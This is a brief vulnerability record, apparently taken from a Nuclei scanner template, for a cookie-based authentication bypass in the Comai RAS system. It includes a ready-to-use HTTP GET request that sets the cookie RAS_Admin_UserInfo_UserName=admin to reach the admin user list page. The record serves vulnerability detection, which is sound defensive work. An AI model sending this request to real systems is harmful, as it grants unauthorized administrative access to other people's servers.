# Vulnerability: Comai RAS System Cookie - Authentication Override
**Classification:** COMAI-RAS
**Source:** Nuclei Template (`comai-ras-cookie-bypass.yaml`)

## Description
Comai RAS system has cookie authentication overreach, when RAS_Admin_UserInfo_UserName is set to admin, the background can be accessed

## Vulnerable Code Pattern / Exploit Payload
```http
GET /Server/CmxUser.php?pgid=UserList HTTP/1.1
Host: {{Hostname}}
cookie: RAS_Admin_UserInfo_UserName=admin
```

